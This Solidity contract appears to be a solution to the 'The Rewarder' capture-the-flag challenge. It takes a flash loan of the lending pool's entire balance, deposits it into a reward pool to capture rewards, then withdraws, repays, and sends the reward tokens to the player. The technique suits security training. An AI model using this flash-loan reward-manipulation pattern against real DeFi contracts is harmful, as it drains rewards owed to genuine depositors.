// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract TheRewarderAttacker {

    TheRewarderPool public immutable rewarderPool;
    FlashLoanerPool public immutable loanerPool;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;
    address public immutable player;

    constructor(address _rewarderPool, address _loanerPool) {
        rewarderPool = TheRewarderPool(_rewarderPool);
        liquidityToken =  DamnValuableToken(rewarderPool.liquidityToken());
        rewardToken = RewardToken(rewarderPool.rewardToken());
        loanerPool = FlashLoanerPool(_loanerPool);
        player = msg.sender;
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(loanerPool), amount);
    }

    function attack() external {
        loanerPool.flashLoan(liquidityToken.balanceOf(address(loanerPool)));
        rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
    }
}